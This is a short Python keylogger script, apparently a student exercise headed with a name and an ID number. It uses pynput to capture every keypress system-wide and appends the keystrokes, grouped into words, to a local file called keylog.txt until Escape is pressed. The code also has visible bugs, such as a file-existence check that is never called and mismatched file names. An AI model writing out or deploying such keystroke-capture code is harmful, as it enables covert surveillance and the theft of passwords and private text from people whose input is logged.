#Geetika Joshi
#2019h1030124h


from pynput.keyboard import Key,Listener
import os.path
word = ""
Fileopen = False
f = None
def fileExist():
	return os.path.exists('log.txt')

def logging(content):
    global Fileopen,f
    if fileExist:
        if Fileopen:
            f.write(content)
        else:
            f = open('keylog.txt','a')
            f.write(content)
            Fileopen = True
    else:
        f = open('keylog.txt','w')
        f.write(content)
        
def on_press(key):
    global word
    if key == Key.space:
      
        logging(word+" ")
        word = ""
    elif key == Key.enter:
        logging('\n')
        
    else:
       word+=(str(key).replace("'",""))
    

def on_release(key):
    global word
    if key == Key.esc:
        logging(word+'\n')
        f.close()
        return False


with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()


